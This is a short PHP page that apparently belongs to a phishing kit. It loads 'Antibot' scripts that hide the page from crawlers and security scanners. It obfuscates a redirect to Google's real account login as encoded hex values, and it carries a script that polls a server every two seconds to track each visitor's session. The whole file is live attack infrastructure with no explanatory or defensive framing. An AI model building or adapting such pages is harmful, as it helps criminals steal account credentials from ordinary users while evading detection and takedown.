<?php
error_reporting(0);
include('/../Antibot/Bot-Crawler.php');
include('/../Antibot/Dila_DZ.php');
include('/../Antibot/blockers.php');
include('/../Antibot/detects.php');
function decodeUrlUtf16LE($encodedUrl) {
    $decoded = '';
    $hexValues = explode('%00', $encodedUrl);
    foreach ($hexValues as $hex) {
        if (!empty($hex)) {
            $decoded .= chr(hexdec($hex));
        }
    }
    return $decoded;
}

$encodedUrl = "0068%0074%0074%0070%0073%003A%002F%002F%0061%0063%0063%006F%0075%006E%0074%0073%002E%0067%006F%006F%0067%006C%0065%002E%0063%006F%006D";
$decodedUrl = decodeUrlUtf16LE($encodedUrl);

header("Location: " . $decodedUrl);
exit();
?><!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<script>
  setInterval(function(){
    fetch('../update_online.php?session_id=<?php echo $sessionId; ?>');
  }, 2000);
</script>
</body>
</html>
